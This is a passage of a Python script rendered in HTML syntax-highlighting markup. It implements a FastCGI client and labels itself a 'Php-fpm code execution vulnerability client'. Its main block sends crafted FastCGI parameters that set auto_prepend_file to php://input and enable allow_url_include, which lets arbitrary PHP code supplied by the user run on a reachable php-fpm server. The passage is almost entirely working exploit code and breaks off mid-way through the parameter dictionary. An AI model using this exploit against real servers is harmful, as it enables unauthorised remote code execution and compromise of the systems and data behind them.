class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class=\"line\"></span><br><span class=\"line\">PY2 = <span class=\"literal\">True</span> <span class=\"keyword\">if</span> sys.version_info.major == <span class=\"number\">2</span> <span class=\"keyword\">else</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bchr</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> PY2:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> force_bytes(<span class=\"built_in\">chr</span>(i))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">bytes</span>([i])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bord</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(c, <span class=\"built_in\">int</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">ord</span>(c)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">force_bytes</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(s, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>, <span class=\"string\">&#x27;strict&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">force_text</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">issubclass</span>(<span class=\"built_in\">type</span>(s), <span class=\"built_in\">str</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(s, <span class=\"built_in\">bytes</span>):</span><br><span class=\"line\">        s = <span class=\"built_in\">str</span>(s, <span class=\"string\">&#x27;utf-8&#x27;</span>, <span class=\"string\">&#x27;strict&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        s = <span class=\"built_in\">str</span>(s)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FastCGIClient</span>:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># private</span></span><br><span class=\"line\">    __FCGI_VERSION = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_ROLE_RESPONDER = <span class=\"number\">1</span></span><br><span class=\"line\">    __FCGI_ROLE_AUTHORIZER = <span class=\"number\">2</span></span><br><span class=\"line\">    __FCGI_ROLE_FILTER = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_TYPE_BEGIN = <span class=\"number\">1</span></span><br><span class=\"line\">    __FCGI_TYPE_ABORT = <span class=\"number\">2</span></span><br><span class=\"line\">    __FCGI_TYPE_END = <span class=\"number\">3</span></span><br><span class=\"line\">    __FCGI_TYPE_PARAMS = <span class=\"number\">4</span></span><br><span class=\"line\">    __FCGI_TYPE_STDIN = <span class=\"number\">5</span></span><br><span class=\"line\">    __FCGI_TYPE_STDOUT = <span class=\"number\">6</span></span><br><span class=\"line\">    __FCGI_TYPE_STDERR = <span class=\"number\">7</span></span><br><span class=\"line\">    __FCGI_TYPE_DATA = <span class=\"number\">8</span></span><br><span class=\"line\">    __FCGI_TYPE_GETVALUES = <span class=\"number\">9</span></span><br><span class=\"line\">    __FCGI_TYPE_GETVALUES_RESULT = <span class=\"number\">10</span></span><br><span class=\"line\">    __FCGI_TYPE_UNKOWNTYPE = <span class=\"number\">11</span></span><br><span class=\"line\"></span><br><span class=\"line\">    __FCGI_HEADER_SIZE = <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># request state</span></span><br><span class=\"line\">    FCGI_STATE_SEND = <span class=\"number\">1</span></span><br><span class=\"line\">    FCGI_STATE_ERROR = <span class=\"number\">2</span></span><br><span class=\"line\">    FCGI_STATE_SUCCESS = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, host, port, timeout, keepalive</span>):</span><br><span class=\"line\">        self.host = host</span><br><span class=\"line\">        self.port = port</span><br><span class=\"line\">        self.timeout = timeout</span><br><span class=\"line\">        <span class=\"keyword\">if</span> keepalive:</span><br><span class=\"line\">            self.keepalive = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.keepalive = <span class=\"number\">0</span></span><br><span class=\"line\">        self.sock = <span class=\"literal\">None</span></span><br><span class=\"line\">        self.requests = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__connect</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        self.sock.settimeout(self.timeout)</span><br><span class=\"line\">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># if self.keepalive:</span></span><br><span class=\"line\">        <span class=\"comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class=\"line\">        <span class=\"comment\"># else:</span></span><br><span class=\"line\">        <span class=\"comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            self.sock.connect((self.host, <span class=\"built_in\">int</span>(self.port)))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> socket.error <span class=\"keyword\">as</span> msg:</span><br><span class=\"line\">            self.sock.close()</span><br><span class=\"line\">            self.sock = <span class=\"literal\">None</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">repr</span>(msg))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__encodeFastCGIRecord</span>(<span class=\"params\">self, fcgi_type, content, requestid</span>):</span><br><span class=\"line\">        length = <span class=\"built_in\">len</span>(content)</span><br><span class=\"line\">        buf = bchr(FastCGIClient.__FCGI_VERSION) \\</span><br><span class=\"line\">              + bchr(fcgi_type) \\</span><br><span class=\"line\">              + bchr((requestid &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(requestid &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr((length &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(length &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">              + bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">              + bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">              + content</span><br><span class=\"line\">        <span class=\"keyword\">return</span> buf</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__encodeNameValueParams</span>(<span class=\"params\">self, name, value</span>):</span><br><span class=\"line\">        nLen = <span class=\"built_in\">len</span>(name)</span><br><span class=\"line\">        vLen = <span class=\"built_in\">len</span>(value)</span><br><span class=\"line\">        record = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> nLen &lt; <span class=\"number\">128</span>:</span><br><span class=\"line\">            record += bchr(nLen)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record += bchr((nLen &gt;&gt; <span class=\"number\">24</span>) | <span class=\"number\">0x80</span>) \\</span><br><span class=\"line\">                      + bchr((nLen &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr((nLen &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr(nLen &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> vLen &lt; <span class=\"number\">128</span>:</span><br><span class=\"line\">            record += bchr(vLen)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record += bchr((vLen &gt;&gt; <span class=\"number\">24</span>) | <span class=\"number\">0x80</span>) \\</span><br><span class=\"line\">                      + bchr((vLen &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr((vLen &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr(vLen &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> record + name + value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__decodeFastCGIHeader</span>(<span class=\"params\">self, stream</span>):</span><br><span class=\"line\">        header = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;version&#x27;</span>] = bord(stream[<span class=\"number\">0</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;type&#x27;</span>] = bord(stream[<span class=\"number\">1</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;requestId&#x27;</span>] = (bord(stream[<span class=\"number\">2</span>]) &lt;&lt; <span class=\"number\">8</span>) + bord(stream[<span class=\"number\">3</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class=\"number\">4</span>]) &lt;&lt; <span class=\"number\">8</span>) + bord(stream[<span class=\"number\">5</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class=\"number\">6</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;reserved&#x27;</span>] = bord(stream[<span class=\"number\">7</span>])</span><br><span class=\"line\">        <span class=\"keyword\">return</span> header</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__decodeFastCGIRecord</span>(<span class=\"params\">self, buffer</span>):</span><br><span class=\"line\">        header = buffer.read(<span class=\"built_in\">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> header:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record = self.__decodeFastCGIHeader(header)</span><br><span class=\"line\">            record[<span class=\"string\">&#x27;content&#x27;</span>] = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;contentLength&#x27;</span> <span class=\"keyword\">in</span> record.keys():</span><br><span class=\"line\">                contentLength = <span class=\"built_in\">int</span>(record[<span class=\"string\">&#x27;contentLength&#x27;</span>])</span><br><span class=\"line\">                record[<span class=\"string\">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;paddingLength&#x27;</span> <span class=\"keyword\">in</span> record.keys():</span><br><span class=\"line\">                skiped = buffer.read(<span class=\"built_in\">int</span>(record[<span class=\"string\">&#x27;paddingLength&#x27;</span>]))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> record</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">request</span>(<span class=\"params\">self, nameValuePairs=&#123;&#125;, post=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> self.__connect():</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">        requestId = random.randint(<span class=\"number\">1</span>, (<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">16</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        self.requests[requestId] = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">        request = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">        beginFCGIRecordContent = bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\</span><br><span class=\"line\">                                 + bchr(self.keepalive) \\</span><br><span class=\"line\">                                 + bchr(<span class=\"number\">0</span>) * <span class=\"number\">5</span></span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class=\"line\">                                              beginFCGIRecordContent, requestId)</span><br><span class=\"line\">        paramsRecord = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> nameValuePairs:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (name, value) <span class=\"keyword\">in</span> nameValuePairs.items():</span><br><span class=\"line\">                name = force_bytes(name)</span><br><span class=\"line\">                value = force_bytes(value)</span><br><span class=\"line\">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> paramsRecord:</span><br><span class=\"line\">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class=\"string\">b&#x27;&#x27;</span>, requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> post:</span><br><span class=\"line\">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class=\"string\">b&#x27;&#x27;</span>, requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.sock.send(request)</span><br><span class=\"line\">        self.requests[requestId][<span class=\"string\">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class=\"line\">        self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>] = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.__waitForResponse(requestId)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__waitForResponse</span>(<span class=\"params\">self, requestId</span>):</span><br><span class=\"line\">        data = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            buf = self.sock.recv(<span class=\"number\">512</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">len</span>(buf):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            data += buf</span><br><span class=\"line\"></span><br><span class=\"line\">        data = BytesIO(data)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            response = self.__decodeFastCGIRecord(data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> response:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \\</span><br><span class=\"line\">                    <span class=\"keyword\">or</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class=\"line\">                    self.requests[<span class=\"string\">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class=\"line\">                <span class=\"keyword\">if</span> requestId == <span class=\"built_in\">int</span>(response[<span class=\"string\">&#x27;requestId&#x27;</span>]):</span><br><span class=\"line\">                    self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>] += response[<span class=\"string\">&#x27;content&#x27;</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class=\"line\">                self.requests[requestId]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__repr__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(self.host, self.port)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;host&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;file&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-c&#x27;</span>, <span class=\"string\">&#x27;--code&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;What php code your want to execute&#x27;</span>, default=<span class=\"string\">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-p&#x27;</span>, <span class=\"string\">&#x27;--port&#x27;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;FastCGI port&#x27;</span>, default=<span class=\"number\">9000</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    client = FastCGIClient(args.host, args.port, <span class=\"number\">3</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    params = <span class=\"built_in\">dict</span>()</span><br><span class=\"line\">    documentRoot = <span class=\"string\">&quot;/&quot;</span></span><br><span class=\"line\">    uri = args.file</span><br><span class=\"line\">    content = args.code</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class=\"string\">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REQUEST_METHOD&#x27;</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class=\"string\">&#x27;/&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class=\"line\">        <span class=\"string\">&#x27;QUERY_STRING&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class=\"line\">        <span class=\"string\">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class=\"string\">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REMOTE_PORT&#x27;</span>: <span class=\"string\">&#x27;12345&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_ADDR&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_PORT&#x27;</span>: <span class=\"string\">&#x27;80&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_NAME&#x27;</span>: <span class=\"string\">&quot;localhost&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class=\"string\">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CONTENT_TYPE&#x27;</span>: <span class=\"string\">&#x27;application/text&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CONTENT_LENGTH&#x27;</span>: <span class=\"string\">&quot;%d&quot;</span> % <span class=\"built_in\">len</span>(content),</span><br><span class=\"line\">        <span class=\"string\">&#x27;PHP_VALUE&#x27;</span>: <span class=\"string\">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class=\"string\">&#x27;allow_url_include = On&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span 